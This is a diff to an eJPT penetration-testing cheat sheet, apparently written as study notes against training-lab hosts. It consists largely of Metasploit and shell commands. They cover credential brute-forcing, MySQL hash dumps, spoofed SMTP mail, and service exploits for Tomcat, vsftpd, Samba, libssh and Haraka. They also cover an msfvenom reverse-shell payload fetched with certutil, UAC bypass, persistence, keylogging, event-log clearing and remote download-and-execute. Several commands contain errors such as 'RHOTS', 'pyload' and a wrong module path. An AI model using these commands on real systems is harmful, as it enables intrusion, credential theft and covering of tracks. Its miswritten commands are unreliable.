@@ -1,7 +1,6 @@
 # eJPT Cheat Sheet
 
-
-## Find IP address of a website:
+#### Find IP address of a website:
 
 ```shell
 host <url>
@@ -587,7 +586,7 @@ run
 > This can be used to find sub domains
 
 ```msfconsole
-use auxiliary/scanner/http/robot_txt
+use auxiliary/scanner/http/robots_txt
 show options
 set RHOST <ip-address>
 run
@@ -1758,5 +1757,883 @@ run
 
 ```msfconsole
 search type:auxiliary name:http
-use auxiliary/scanner/http/http_version
+use auxiliary/scanner/http/http_header
+set RHOSTS <ip-address>
+run
 ```
+
+> Tells the data related to the HTTP header.
+
+```msfconsole
+use auxiliary/scanner/http/robots_txt
+show options
+set RHOST <ip-address>
+run
+```
+
+> Will show the data of `robots.txt`.
+
+```msfconsole
+use auxiliary/scanner/http/dir_scanner
+show options
+set RHOSTS <ip-address>
+set DICTIONARY /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt
+run
+```
+
+> This module can be used to enumerate directories.
+
+```msfconsole
+use auxiliary/scanner/http/files_dir
+show options
+set RHOSTS <ip-address>
+set DICTIONARY /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt
+run
+```
+
+> This can give you the names of different files on the machine
+
+```msfconsole
+use auxiliary/scanner/http/http_login
+show options
+set RHOSTS <ip-affress>
+set AUTH_URI /<URI>/
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt
+set VERBOSE false
+run
+```
+
+> This will find brute force credentials. 
+
+```msfconsole
+use auxiliary/scanner/http/apache_userdir_enum
+show options
+set RHOSTS <ip-affress>
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set VERBOSE fals
+run
+```
+
+> This can be used to brute force users on the target.
+
+```msfconsole
+use auxiliary/scanner/http/http_put
+set RHOSTS victim-1
+set PATH /data
+set FILENAME test.txt
+set FILEDATA "Welcome To AttackDefense"
+run
+```
+
+> Using this module write a file on the target server. If the file is already exists it will overwrite it.
+
+```Shell
+wget http://victim-1:80/data/test.txt 
+cat test.txt
+```
+
+> Use `wget` and download the `test.txt` file and verify it.
+
+```msfconsole
+use auxiliary/scanner/http/http_put
+set RHOSTS victim-1
+set PATH /data
+set FILENAME test.txt
+set ACTION DELETE
+run
+```
+
+> This module can be used to `DELETE` the `test.txt` file.
+
+#### MySQL Enumeration:
+
+```msfconsole
+use auxiliary/scanner/mysql/mysql_version
+show options
+set RHOTS <ip-address>
+run
+```
+
+> This module can be used to find the module of the SQL running on the machine.
+
+```msfconsole
+use auxiliary/scanner/mysql/mysql_login
+show options
+set RHOTS <ip-address>
+set USERNAME root
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+run
+```
+
+> This can be used to brute force my SQL user `root`.
+
+```msfconsole
+use auxiliary/admin/mysql/mysql_enum
+show options
+set USERNAME root
+set PASSWORD twinkle
+set RHOTS <ip-address>
+run
+```
+
+***NOTE: THIS MODULE CAN ONLY RUN IF YOU HAVE VALID CREDS OF A USER ACCOUNT***
+
+> This enumerates info. related to the SQL service running on the system.
+
+```msfconsole
+use auxiliary/admin/mysql/mysql_sql
+show options
+set USERNAME root
+set PASSWORD twinkle
+set RHOTS <ip-address>
+set SQL <any-quary>
+run
+```
+
+> This module can be used to execute SQL Commands.
+
+```msfconsole
+use auxiliary/scanner/mysql/mysql_schemadump
+show options
+set USERNAME root
+set PASSWORD twinkle
+set RHOTS <ip-address>
+run
+```
+
+> This shows tables in the respective tables.
+
+```msfconsole
+use auxiliary/scanner/mysql/mysql_file_enum
+set USERNAME root
+set PASSWORD twinkle
+set RHOSTS demo.ine.local
+set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+set VERBOSE true
+run
+```
+
+> This module can be used to enumerate files in a SQL.
+
+```msfconsole
+use auxiliary/scanner/mysql/mysql_hashdump
+set USERNAME root
+set PASSWORD twinkle
+set RHOSTS demo.ine.local
+run
+```
+
+> This module dumps all the hashes from the user.
+
+```msfconsole
+use auxiliary/scanner/mysql/mysql_writable_dirs
+set RHOSTS demo.ine.local
+set USERNAME root
+set PASSWORD twinkle
+set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+run
+```
+
+> This module gives us the list of all the writeable directories within a machine.
+
+#### SSH Enumeration:
+
+```msfconsole
+use auxiliary/scanner/ssh/ssh_version
+set RHOSTS <ip-address>
+run
+```
+
+> This system gives the version of SSH running on the machine.
+
+```msfconsole
+use auxiliary/scanner/ssh/ssh_login
+set RHOTS <ip-address>
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
+set VERBOSE false
+run
+```
+
+> This can be used to brute force username and their passwords.
+
+```msfconsole
+use auxiliary/scanner/ssh/ssh_enumusers
+set RHOTS <ip-address>
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+run
+```
+
+> This can be enumerate users on the system.
+
+#### SMTP Enumeration:
+
+```msfconsole
+use auxiliary/scanner/smtp/smtp_version
+set RHOSTS <ip-address>
+run
+```
+
+> This system gives the version of SMTP running on the machine.
+
+```msfconsole
+use auxiliary/scanner/smtp/smtp_users
+set RHOTS <ip-address>
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+run
+```
+
+> This can be used to brute force usernames.
+
+```shell
+nmap -sV -script banner <ip-address>
+```
+
+> This SMTP version tells us about the SMTP server name and banner.
+
+```shell
+nc demo.ine.local 25
+```
+
+> Net Cat can be used to interact with the system.
+
+```console
+VRFY <user>@<domain>.xyz
+VRFY commander@openmailbox.xyz
+```
+
+> This can be used to verify a user for a certain domain.
+
+```
+telnet <ip-address> 25
+HELO attacker.xyz
+EHLO attacker.xyz
+```
+
+> This tells us what commands can be used to check the supported commands/capabilities.
+
+```Shell
+smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t <ip-address>
+```
+
+> This command can be used to find common users using the tool `smtp-user-enum`
+
+```shell
+telnet demo.ine.local 25
+HELO attacker.xyz
+mail from: admin@attacker.xyz
+rcpt to:root@openmailbox.xyz
+data
+Subject: Hi Root
+Hello,
+This is a fake mail sent using telnet command.
+From,
+Admin
+.
+```
+
+> This how we can connect to SMTP service using telnet and send a fake mail to root user. There is a dot(.) in the last line which indicates the termination of data.
+
+```Shell
+sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no
+```
+
+> Sending mail through command line.
+
+#### WMAP MSF Plugin commands:
+
+`load wmap`: To load the plugin
+`wmap_sites -a <IP>`: Is can be used to add a site.
+`wmap_sites -l`: Is used to list out all the available sites.
+`wmap_targets -t <URL>`: Is used to add a target URL.
+`wmap_targets -l`: Is used to list out all the targets that are available.
+`wmap_run -t`: This will show all enabled modules.
+`wmap_run -e`: This will start running the vuln. scan.
+`wmap_vuln -l`: This lists all the vulnerabilities that the scan was able to find.
+
+```msfconsole
+use auxiliary/http/options
+show options
+set RHOSTS <ip-address>
+run
+```
+
+> This module tells us if the web-application allows different methods like `GET`, `HEAD`, `POST`, and `OPTIONS`.
+
+```msfconsole
+use auxiliary/http/http_put
+show options
+set RHOSTS <ip-address>
+set PATH /<directory>/
+run
+```
+
+> This can be used to upload a file on to the specified directory.
+
+#### Exploiting WinRM
+
+***DEFAULT PORT `5986`***
+
+```msfconsole
+search type:auxiliary winrm
+use auxiliary/winrm/winrm_auth_methods
+set RHOSTS <ip-address>
+run
+```
+
+> This will tell that whether `WinRM` is running on the machine and if it running than what authentication methods are being used.
+
+```msfconsole
+use auxiliary/winrm/winrm_login
+set RHOST <ip-address>
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+Set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+run
+```
+
+> This can be used to brute force usernames and their respective passwords.
+
+```msfconsole
+use auxiliary/winrm/winrm_cmd
+set RHOST <ip-address>
+set USERNAME <user>
+set PASSWORD <pass>
+set CMD whoami
+run
+```
+
+> This can be used to run commands on the machine
+
+```msfconsole
+use exploit/windows/winrm/winrm_script_exec
+set RHOST <ip-address>
+set USERNAME <user>
+set PASSWORD <pass>
+set FORCE_VBS true
+run
+```
+
+> This can be used to obtain a meterpreter session on the service.
+
+#### Exploitation of Tomcat
+
+```msfconsole
+search type:exploit tomcat_jsp
+use exploit/multi/http/tomcat_jsp_upload_bypass
+set RHOST <ip-address>
+set pyload java/jsp_shell_blind_tcp
+set SHELL cmd
+exploit
+```
+
+> This will give you a command shell session but not a meterpreter session on the system.
+
+```shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local-ip> LPORT=1234 -f exe > meterpreter.exe 
+```
+
+> This is a payload file that we will transfer on to the system and then we'll use it to get a meterpreter session.
+
+```shell
+sudo python -m SimpleHTTPServer 80
+```
+
+> Command to start a simple `HTTP File Server`.
+
+```CMD
+certutil -url http://<local-ip>/meterpreter.exe meterpreter.exe
+```
+
+> This can be used to download the file from the HTTP server with accessing the browser.
+
+```msfconsole
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <local-ip>
+set LPORT
+run
+```
+
+> Set up a multi handler to get a meterpreter shell.
+
+```CMD
+./meterpreter.exe
+```
+
+> Run the script from the java shell and you'll receive a meterpreter session on the msfconsole.
+
+#### VSFTPD Exploitation:
+
+```msfconsole
+search vsftpd
+use 1
+set RHOST <ip-address>
+exploit
+```
+
+> Exploit module for `vsftpd 2.3.4`. It gives you rot privileges
+
+```msfconsole
+CTRIL + Z
+y
+use post/multi/manage/shell_to_meterpreter
+show options
+set LHOST <local-ip>
+run
+```
+
+> It can be used to convert the shell session to a meterpreter session. If it gives an error don't worry you can access the session from the `sessions` command.
+
+#### SAMBA Exploitation
+
+```msfconsole
+search type:exploit name:samba
+use exploit/linux/samba/is_known_pipename
+set RHOST <ip-address>
+check
+exploit
+```
+
+> `check` command can be used to identify whether the system is vulnerable or not. This will give us a command shell session not a meterpreter session so we would have to go it our selves using `shell_to_meterperter` module.
+
+```msfconsole
+CTRIL + Z
+y
+use post/multi/manage/shell_to_meterpreter
+show options
+set LHOST <local-ip> 
+set LHOST eth1
+run
+```
+
+> It can be used to convert the shell session to a meterpreter session. If it gives an error don't worry you can access the session from the `sessions` command.
+
+#### SSH Exploitation:
+
+```msfconsole
+search libssh_auth_bypass
+use 1
+show options
+set RHOST <ip-address>
+set SPAWN_PTY true
+run
+```
+
+> This can be used to tell weather it is vulnerable and can be used to gain a sell session.
+
+```msfconsole
+CTRIL + Z
+y
+use post/multi/manage/shell_to_meterpreter
+show options 
+set LHOST eth1
+set SESSION <session-id>
+run
+```
+
+> It can be used to convert the shell session to a meterpreter session. If it gives an error don't worry you can access the session from the `sessions` command. Other than this you can also use the `sessions -u 1` command to upgrade a shell session into a meterpreter session.
+
+#### SMTP Server Exploitation
+
+```msfconsole
+search type:exploit name:haraka
+use 1
+set rhost <ip-address>
+set SEVPORT 9898
+set email_to <email-address>
+set payload linux/x64/meterpreter_reverse_http
+set LHOST eth1
+run
+```
+
+> This module after running will give us a meterpreter session. In the module `email_to` should be an email that the server should accept.
+
+#### Meterpreter Commands:
+
+`sysinfo`: This gives us basic system info like the OS, PC Name and all
+`get uid`: This command tells us about our permissions.
+`help`: This gives all the commands and their details.
+`backgroud`: This is used to put the session in background.
+`kill`: This will kill the current session.
+`search -d /dir/path -f "<file-name>"`: This command can be used to find a particular file in a directory.
+`search -f *.exe`: This can be used to find all the `exe` file or any extension that you'll enter.
+`download <file-name>`: This can be used to download a file.
+`shell`: This can be used to pop the native shell of the machine.
+`ps`: This can be used to list down all the processes.
+`getsystem:` This command can be used to automatically elevate the privileges of the current exploited user on **windows**.
+`screenshot:` This command can be used to click a screenshot of the **windows screen**.
+`hashdump`: This command can be used to dump all the hashes of passwords with in the SAM DB.
+`show_mount`: This will tell all the disks mounted with the windows user.
+`migrate <pid>`: This can be used to migrate to any current running processes.
+`loot`: After that you have ran some enumeration modules you can find the data saved in texts using this command 
+
+#### Windows Post Exploitation Module:
+
+```msfconsole
+use post/windows/manage/migrate
+set SESSION <session-id>
+run
+```
+
+> This module can be used to create a new process and then migrate into it. If you already have migrated then this would not work.
+
+```msfconsole
+use post/windows/gather/win_privs
+show options
+set SESSION <session-id>
+run
+```
+
+> This is list out all the privileges that the current exploitered user have.
+
+```
+use post/windows/gather/enum_logged_on_users
+show options
+set SESSION <session-id>
+run
+```
+
+> This will list all the currently and recently logged on users.
+
+```msfconsole
+use post/windows/gather/checkvm
+show options
+set SESSION <session-id>
+run
+```
+
+> This will tell us weather that machine is a VM or not.
+
+```msfconsole
+use post/windows/gather/enum_applications
+show options
+set SESSION <session-id>
+run
+```
+
+> This lists down all the application and their respective versions installed on the machine so that they can be used to further exploit and elevate the privileges.
+
+```msfconsole
+use post/windows/gather/enum_av_excluded
+show options
+set SESSION <session-id>
+run
+```
+
+> This module can be used to list out all the directories that are currently not looked after by the AV or the Win Defender.
+
+```msfconsole
+use post/windows/gather/enum_computers
+show options
+set SESSION <session-id>
+run
+```
+
+> This will tell us whether the machine is a stand alone machine or a machine that is part of a domain.
+
+```msfconsole
+use post/windows/gather/enum_patches
+show options
+set SESSION <session-id>
+run
+```
+
+> This will give us the patches that being installed in the machine. You can also do this by typing the `shell > systeminfo` command as it is a native windows command.
+
+```msfconsole
+use post/windows/gather/enum_shares
+show options
+set SESSION <session-id>
+run
+```
+
+> This will lists all the shares within the machine.
+
+```msfconsole
+use post/windows/manage/enable_rdp
+show options
+set SESSION <session-id>
+run
+```
+
+> This will tell us whether `RDP` is enabled on the machine or not. If it isn't enabled than it will enable it by it self.
+
+#### Bypassing UAC Through Memory Injection:
+
+***EVERYTHING DEMOSTARTED BELOW IS DONE AFTER THE FIRST FOOTHOLD HAS BE GAINED***
+
+```
+Ctrl + Z
+y
+use exploit/windows/local/bypassuac_injection
+set SESSION <session-id>
+set LPORT 4433
+set TARGET\ x64
+run
+```
+
+> This will bypass UAC using the injection method.
+
+***NOW THIS WILL NOT ELEVATE OUR PRIVILAGES BUT WILL GIVE A NEW METERPRETER SESSION THAT WILL HAVE THE UAC FLAG TURNED OFF AND AFTER THAT YOU CAN USE THE*** **`getsystem`** ***COMMAND TO ELIVATE YOUR PRIVILEGES***
+
+#### Establishing Persistence on Windows:
+
+```msfconsole
+use exploit/windows/local/persistence_service
+set payload windows/meterpreter/reverse_tcp
+show options
+set SESSION <session-id>
+run
+```
+
+> This will startup a service that we can always connect to via a handler after the current session is terminated.
+
+```msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST eth1
+run
+```
+
+> Now if you run this you'll immediately get a meterpreter sessions.
+
+***ALWAYS KEEP IN MIND THE*** **`LHOST`** ***AND*** **`LPORT`** ***OPTIONS***
+
+#### Enabling RDP
+
+```msfconsole
+use post/windows/manage/enable_rdp
+show options
+set RHOSTS <ip-address>
+set SESSION <session-id>
+run
+```
+
+> This will enable the `RDP` service on port `3389`. 
+
+***NOW AFTER THIS WE WOULD HAVE TO CHANGE THE PASSWORD IN ***
+
+```msfconsole
+shell
+net users
+net user administrator <password-any>
+```
+
+> This will change the password of the `administrator` user. This can only be done via a privileged access.
+
+```shell
+xfreerdp /u:administrator /p:<password-any> /v:<ip-address>
+```
+
+> This command can be used from the console of your linux machine in order to interact with the `RCD` of the target machine using the new creds.
+
+#### Windows Keylogging:
+
+***FIRST MIGRATE TO*** **`explorer`** ***PROCESS AND THEN RUN THE KEYLOGGER.***
+
+```msfconsole
+pgrep explorer
+migrate <pid>
+```
+
+> Migration to `explorer`
+
+`keyscan_start`: This will start the key stroke sniffer.
+`keyscan_dump`: This will dump all the captured key strokes.
+
+#### Clearing Windows Logs:
+
+**Note:**
+
+> Everything demonstrated here after is basically done after the initial foothold.
+
+`clearev`: This command in the meterpreter is used to clear the event logs of the machine.
+
+#### Pivoting:
+
+```msfconsole
+run autoroute -s 10.0.16.0/20
+```
+
+> This command can be used to set route from one network to another network. First type `ifconfig` or `ipconfig` to check all the possible interfaces on the machine.
+
+```msfconsole
+background
+use auxiliary/scanner/portscan/tcp
+set RHOSTS demo2.ine.local
+set PORTS 1-100
+exploit
+```
+
+> This module can be then used to run a port scan on the machine who's network route we have just added.
+
+```msfconsole
+sessions -i 1
+portfwd add -l 1234 -p 80 -r demo2.ine.local
+portfwd list
+```
+
+> These set of commands can be used to port forward a port of the target machine on to a port of `localhost`.
+
+```shell
+nmap -sV -sS -p 1234 localhost
+```
+
+> Now you can run a scan the target machines port using this command.
+
+#### Linux Post Exploitation Modules
+
+`cat /etc/passwd`: This command lists out all the users and service accounts on the machine and needs `root` privileges to execute.
+`groups <username>`: This will tell you which user group the entered username belongs to.
+`bin/bash -i`: This command can be used to get a bash shell after meterpreter session is opened.
+`cat /etc/*issue`: This will tell you the release version of the machine.
+`uname -r`: This tells the kernel version:
+`ps aux`: This command lists down all the processes running on the system.
+`env:` This tells all the environment valuables for the current logged in user.
+
+```msfconsole
+use post/linux/gather/enum_configs
+show options
+set SESSION <session-id>
+run
+```
+
+> This will give addresses of all the configuration files on the machine.
+
+```msfconsole
+use post/linux/gather/env
+show options
+set SESSION <session-id>
+run
+```
+
+> This will show all the env related data like versions and all.
+
+```msfconsole
+use post/linux/gather/enum_network
+show options
+set SESSION <session-id>
+run
+```
+
+> This will give all the network related data and configuration files.
+
+```msfconsole
+use post/linux/gather/enum_protections
+show options
+set SESSION <session-id>
+run
+```
+
+> This module checks all the basic system hardening methods are in place or not.
+
+```msfconsole
+use post/linux/gather/enum_system
+show options
+set SESSION <session-id>
+run
+```
+
+> This gathers system and user infos.
+
+```msfconsole
+use post/linux/gather/checkcontainer
+show options
+set SESSION <session-id>
+run
+```
+
+> This will check whether we are in a container or an actual machine.
+
+```msfconsole
+use post/linux/gather/checkvm
+show options
+set SESSION <session-id>
+run
+```
+
+> This will tell that weather the machine is a VM or an actual machine.
+
+```msfconsole
+use post/linux/gather/enum_users_history
+show options
+set SESSION <session-id>
+run
+```
+
+> This lists down all the users history and commands that a specific user ran. It is saved in `loot` as well and you can access the saved data from there as well.
+
+```msfconsole
+use post/multi/manage/system_session
+set SESSION <session-id>
+set TYPE python
+set HANDLER true
+set LHOST <host-ip>
+run
+```
+
+> This module will create a Reverse TCP Shell on the target system using the system's own scripting environments installed on the target.
+
+***FUN STUFF***
+
+```bash
+useradd hacker
+useradd test
+useradd nick
+```
+
+> Create a file with the following data and name it as `test.sh`.
+
+```shell
+/etc/init.d/apache2 start
+cp test.sh /var/www/html
+```
+
+> Turn the `apache2` and copy the created file in the `/var/www/html` directory
+
+```msfconsole
+use post/linux/manage/download_exec
+set URL http://<HOST-IP>/test.sh
+set SESSION 1
+run
+```
+
+> Now use this module to download and run the file on the target machine.
+
+```msfconsole
+sessions -i 1
+cat /etc/passwd
+```
+
+> Now after the execution three users will be created you can check them using the following commands.
+
+#### Linux Privilege Escalation: Exploiting a vulnerable program
+
+***IT DEPENDS ON THE VERSION OF THE LINUX KERNEL RUNNINGON THE MACHINE AND THE DISTRIBUTION VERSION***
+
+```ruby
+sessions -u <session-id>
+```
+
+> This command can be used to upgrade your current session into a meterpreter session and if it gives you can error then don't worry you can check the new session from the `sessions` command and than load the new one.
+
+```bash
+chkrootkit -V
+```
+
+> This can be used to check the rootkit version running on the linux machine.
+
+***VERSIONS OLDER THAN 0.50 OF THE CHKROOTKIT ARE VULNARABLE TO LOCAL PRIVELAGE ESCALATION VULNARABILITY***
+
+```msfconsole
+search exploit/unix/local/chkrootkit
+show options
+set CHKROOTKIT /path/to/file
+set SESSION <session-id>
+set LHOST <localhost-ip>
+exploit
+```
+
+> This will exploit the vulnerability by creating a cron job.
